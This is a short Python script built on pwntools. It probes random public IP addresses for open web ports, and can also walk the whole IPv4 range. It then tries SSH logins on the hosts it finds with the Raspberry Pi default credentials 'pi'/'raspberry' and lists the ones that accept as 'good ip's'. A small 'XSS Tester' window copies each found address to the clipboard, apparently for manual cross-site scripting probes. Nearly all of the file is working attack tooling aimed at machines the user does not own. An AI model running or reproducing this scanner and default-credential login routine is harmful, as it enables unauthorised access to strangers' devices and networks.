import os
import time
import random
import pwn
import pyperclip
import tkinter


# ip address format: X:X:X:X    range: 0.0.0.0 > 255.255.255.255


websites = []
goodips = []
counter = 0

def nextcp(event):
    global websites
    global counter
    if counter < len(websites):
        print(websites[counter])
        pyperclip.copy(websites[counter])
        counter += 1
    else:
        counter = 0
        print("The end.")

def all():
    global websites
    global goodips
    ip1 = 1
    ip2 = 1
    ip3 = 1
    ip4 = 1
    for _ in range(255**4):
        if ip1 > 255:
            ip1 = 1
            ip2 += 1
        if ip2 > 255:
            ip2 = 1
            ip3 += 1
        if ip3 > 255:
            ip3 = 1
            ip4 += 1
        if ip4 > 255:
            break
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        print(ip)
        try:
            print(pwn.remote(ip,80,timeout=0.05))
            websites.append(ip)
            print("FOUND WEBSITE    =====================================================================================")
        except:
            pass
        ip1 += 1
    ask = input("Do you want to check good ip's with port 22? (y/n): ")
    if ask=="y":
        if len(websites)!=0:
            for i in websites:
                try:
                    s = pwn.ssh(host=i,
                        user='pi',
                        password='raspberry')
                    s.connect_remote(s.host, 22, timeout=5)
                    goodips.append(i)
                except:
                    print("Trying: "+i+" ERROR with connection.")
    else:
        print("ok")
    print("good ip's: "+str(goodips))
    print("websites: "+str(websites))
    print("number of good ip's: "+str(len(goodips)))
    print("number of websites: "+str(len(websites)))

    root = tkinter.Tk()
    root.title("XSS Tester")
    root.geometry("500x200")
    b1 = tkinter.Button(root, text="NEXT", width=50, height=10)
    b1.pack()
    b1.bind("<Button-1>", nextcp)
    root.mainloop()

def randm():
    global websites
    global goodips
    ip1 = 1
    ip2 = 1
    ip3 = 1
    ip4 = 1
    for _ in range(10000):
        ip1 = random.randint(1,255)
        ip2 = random.randint(1,255)
        ip3 = random.randint(1,255)
        ip4 = random.randint(1,255)
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        try:
            print(pwn.remote(ip,80,timeout=0.05))
            websites.append(ip)
            print("FOUND WEBSITE    =====================================================================================")
        except:
            pass
        ip1 += 1
    ask = input("Do you want to check good ip's with port 22? (y/n): ")
    if ask=="y":
        if len(websites)!=0:
            for i in websites:
                try:
                    s = pwn.ssh(host=i,
                        user='pi',
                        password='raspberry')
                    s.connect_remote(s.host, 22, timeout=5)
                    goodips.append(i)
                except:
                    print("Trying: "+i+" ERROR with connection.")
    else:
        print("ok")
    print("good ip's: "+str(goodips))
    print("websites: "+str(websites))
    print("number of good ip's: "+str(len(goodips)))
    print("number of websites: "+str(len(websites)))

    root = tkinter.Tk()
    root.title("XSS Tester")
    root.geometry("500x200")
    b1 = tkinter.Button(root, text="NEXT", width=50, height=10)
    b1.pack()
    b1.bind("<Button-1>", nextcp)
    root.mainloop()

randm()